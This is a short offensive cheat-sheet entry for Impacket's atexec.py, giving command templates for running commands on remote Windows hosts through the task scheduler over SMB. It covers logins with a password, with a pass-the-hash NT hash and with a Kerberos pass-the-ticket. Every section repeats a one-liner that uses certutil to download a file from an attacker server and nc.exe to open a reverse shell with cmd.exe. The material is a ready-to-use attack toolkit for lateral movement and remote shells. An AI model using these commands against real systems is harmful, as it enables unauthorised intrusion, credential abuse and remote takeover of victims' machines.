# atexec.py (imp)

%  windows, impacket-exec
#plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  

## desc
```
Execute command view the task scheduler (using \pipe\atsvc via SMB)
```

## execute (creds)
certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe>
```bash
atexec.py -debug <domain_fqdn>/<user>:'<password>'@<target_fqdn> <cmd>
```

## execute (pth)
certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe>
```bash
atexec.py -debug -hashes :<nt_hash>  <domain_fqdn>/<user>@<target_fqdn> <cmd>
```

## execute (ptt)
certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file>; nc.exe <ip> <port> -e cmd.exe>
```bash
KRB5CCNAME=<ccache> atexec.py -no-pass -k <target_fqdn> <cmd></cmd>
```